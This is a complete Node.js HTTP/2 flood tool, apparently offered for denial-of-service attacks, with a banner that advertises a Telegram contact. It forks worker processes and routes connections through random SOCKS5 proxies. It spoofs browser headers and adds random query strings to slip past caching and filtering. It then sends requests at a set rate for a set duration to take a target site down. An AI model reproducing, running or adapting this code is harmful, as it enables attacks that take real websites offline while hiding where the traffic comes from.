const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const { SocksClient } = require('socks');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', (err) => { console.error("Uncaught Exception:", err); });
process.on('unhandledRejection', (reason) => { console.error("Unhandled Rejection:", reason); });

if (process.argv.length < 7) {
    console.log(`Usage: target time rate thread proxyFilePath`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").split(/\r?\n/);
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function getRandomElement(array) {
    return array[getRandomInt(0, array.length)];
}

function generateRandomString(length) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars.charAt(getRandomInt(0, chars.length));
    }
    return result;
}

const config = {
    target: process.argv[2],
    duration: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFilePath: process.argv[6]
};

const sigAlgorithms = ['ecdsa_secp256r1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512'];
const acceptHeaders = [
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
];
const languageHeaders = ['ko-KR', 'en-US', 'zh-CN', 'zh-TW', 'en-ZA'];
const encodingHeaders = ['gzip, deflate, br', 'deflate', 'gzip, deflate, lzma, sdch', 'deflate'];
const userAgents = [
    '"Google Chrome";v="113", "Chromium";v="113", ";Not A Brand";v="99"',
    '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"'
];

const proxies = readLines(config.proxyFilePath);
const targetUrl = url.parse(config.target);

if (cluster.isMaster) {
    for (let i = 0; i < config.threads; i++) {
        cluster.fork();
    }

    console.clear();

    function createGradient(startColor, endColor, steps) {
        const startRGB = parseRGB(startColor);
        const endRGB = parseRGB(endColor);
        const stepSize = 1 / (steps - 1);
        const gradient = [];

        for (let i = 0; i < steps; i++) {
            const rgb = interpolateRGB(startRGB, endRGB, i * stepSize);
            gradient.push(toAnsiCode(rgb));
        }

        return gradient;
    }

    function parseRGB(color) {
        const regex = /\x1b\[38;2;(\d+);(\d+);(\d+)+m/;
        const match = color.match(regex);
        if (match) {
            return { r: parseInt(match[1]), g: parseInt(match[2]), b: parseInt(match[3]) };
        }
        return null;
    }

    function interpolateRGB(start, end, ratio) {
        const r = Math.round(start.r + (end.r - start.r) * ratio);
        const g = Math.round(start.g + (end.g - start.g) * ratio);
        const b = Math.round(start.b + (end.b - start.b) * ratio);
        return { r, g, b };
    }

    function toAnsiCode(rgb) {
        return `\x1b[38;2;${rgb.r};${rgb.g};${rgb.b}m`;
    }

    const gradientColors = createGradient('\x1b[38;2;201;143;143m', '\x1b[38;2;148;0;211m', 5);

    console.log(`${gradientColors[0]}Target: ${targetUrl.host}\x1b[0m`);
    console.log(`${gradientColors[1]}Duration: ${config.duration}\x1b[0m`);
    console.log(`${gradientColors[2]}Threads: ${config.threads}\x1b[0m`);
    console.log(`${gradientColors[3]}Requests per second: ${config.rate}\x1b[0m`);
    console.log(`${gradientColors[4]}Telegram: @FolK7\x1b[0m`);
} else {
    setInterval(initiateFlood);
}

class ConnectionManager {
    createSocks5Connection(options, callback) {
        console.log(`Attempting to create SOCKS5 connection to ${options.proxyHost}:${options.proxyPort}`);
        const connectionOptions = {
            proxy: {
                ipaddress: options.proxyHost,
                port: options.proxyPort,
                type: 5, // Socks5
            },
            command: 'connect',
            destination: {
                host: options.address.split(":")[0],
                port: parseInt(options.address.split(":")[1]),
            }
        };

        SocksClient.createConnection(connectionOptions, (err, info) => {
            if (err) {
                console.error(`SOCKS5 connection error: ${err.message}`);
                return callback(undefined, "error: " + err.message);
            }
            console.log(`SOCKS5 connection established to ${options.address} through ${options.proxyHost}:${options.proxyPort}`);
            return callback(info.socket, undefined);
        });
    }
}

function generateUserAgent() {
    const chromeVersion = getRandomInt(120, 123);
    return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0 Safari/537.36`;
}

function generateHeaders() {
    return {
        ":method": "GET",
        ":authority": targetUrl.host,
        ":path": `${targetUrl.path}?${generateRandomString(10)}=${generateRandomString(5)}`,
        ":scheme": "https",
        "sec-ch-ua": getRandomElement(userAgents),
        "sec-ch-ua-platform": "Windows",
        "sec-ch-ua-mobile": "?0",
        "upgrade-insecure-requests": "1",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "x-requested-with": "XMLHttpRequest",
        "accept-encoding": getRandomElement(encodingHeaders),
        "accept-language": getRandomElement(languageHeaders),
        "accept": getRandomElement(acceptHeaders),
        "user-agent": generateUserAgent()
    };
}

function initiateFlood() {
    const proxy = getRandomElement(proxies);
    const [proxyHost, proxyPort] = proxy.split(":");

    const proxyOptions = {
        proxyHost,
        proxyPort: parseInt(proxyPort),
        address: `${targetUrl.host}:443`,
        timeout: 100
    };

    const connectionManager = new ConnectionManager();
    connectionManager.createSocks5Connection(proxyOptions, (conn, error) => {
        if (error) {
            console.error("Failed to establish SOCKS5 connection:", error);
            return;
        }
        conn.setKeepAlive(true, 60000);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ["h2"],
            sigals: getRandomElement(sigAlgorithms),
            socket: conn,
            ciphers: "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384",
            ecdhCurve: "P-256:P-384",
            host: targetUrl.host,
            servername: targetUrl.host,
            rejectUnauthorized: false
        };

        const tlsConn = tls.connect(443, targetUrl.host, tlsOptions);

        const http2Client = http2.connect(targetUrl.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 10000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: conn,
        });

        http2Client.on("connect", () => {
            const req = http2Client.request(generateHeaders());

            req.on("response", () => {
                startFlooding(http2Client, []);
            });

            req.end();
        });

        function startFlooding(client, cookies) {
            setInterval(() => {
                for (let i = 0; i < config.rate; i++) {
                    const req = client.request(generateHeaders());

                    req.on("response", () => {
                        req.close();
                        req.destroy();
                    });

                    req.end();
                }
            }, 500);
        }

        http2Client.on("close", () => {
            http2Client.destroy();
            conn.destroy();
        });
    });
}

setTimeout(() => process.exit(1), config.duration * 1000);
